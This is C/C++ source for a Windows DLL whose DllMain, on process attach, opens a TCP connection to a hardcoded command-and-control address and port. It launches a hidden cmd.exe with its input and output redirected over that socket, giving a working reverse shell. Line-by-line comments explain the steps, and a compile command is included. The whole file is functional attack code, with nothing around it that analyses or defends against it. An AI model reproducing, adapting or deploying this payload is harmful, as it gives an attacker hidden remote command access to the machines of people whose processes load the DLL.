/*
 * Original code comes from https://gist.github.com/loneicewolf/03d71d65735d8b2d34b5c60b1232d144
 * i686-w64-mingw32-gcc -o win_rsh win_rsh.c -lws2_32
 */
#include "pch.h"
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#pragma comment(lib, "ws2_32") // Point the linker to ws2_lib library 



char server_ip[] = "192.168.80.134"; // Command and control listening server IP
int server_port = 2936;        // Command and control listening server PORT
std::string str = "cmd";
LPSTR s = const_cast<char*>(str.c_str());

//Entry point for DLL is WINAPI DllMain instead of main function
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {

    /* Here we have the reason which is in which context shall the code be executed
     * In this case it's process attach call
     */

    if (reason == DLL_PROCESS_ATTACH) {
        WSADATA wsaData; // windows sockets options structure
        SOCKET sock; // The socket itself that is going to be used
        struct sockaddr_in server; // a structure that contains the socket's options (ip,port,address family,...)
        STARTUPINFOA si = { 0 }; // Startup info structure of the socket regarding starting from a new window or something...
        PROCESS_INFORMATION pi;  // process information structure related to the command line process

        WSAStartup(MAKEWORD(1, 0), &wsaData); // Windows Sockets initialization call
        sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // Create the socket
        server.sin_family = AF_INET; // set the server net family to IPv4
        inet_pton(AF_INET, server_ip, &server.sin_addr.s_addr); // converts text format of the server IP to binary and assign it to the server structure 
        server.sin_port = htons(server_port); // server port to communicate with
        WSAConnect(sock, (const PSOCKADDR)&server, sizeof(server), NULL, NULL, NULL, NULL); // Create the socket connection
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock; // create I/O handlers for the open socket
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); /*
                    * Assigning flags to the startup of the socket
                    * STARTF_USESTDHANDLES tells the system to use standard I/O handlers
                    * in this case these handles are si.hStdInput, si.hStdOutput and si.hStdError
                    * STARTF_USESHOWWINDOW sets the flag for the show window option which will later be set to hidden
                    */
        si.wShowWindow = SW_HIDE; // Set the window visibility of the socket instatnce to hidden
        CreateProcessA(NULL,   // Application path name if specified
            s, // cmdlet to be executed directly from a command line instance
            NULL,  // security attributes for the process that define if the handle can be inherited. In this case no
            NULL,  // security attributes for the thread that define if the handle can be inherited. In this case no
            TRUE,  // each inheritable handle in the calling process is inherited by the new process
            CREATE_NEW_CONSOLE, // Create a new console window for that process
            NULL,  // the new process uses the environment of the calling process
            NULL,  // he new process will have the same current drive and directory as the calling process
            &si,   // pointer to the STARTUPINFO structure
            &pi  // pointer to the  PROCESS_INFORMATION structure
        );

    }
    return TRUE;
}
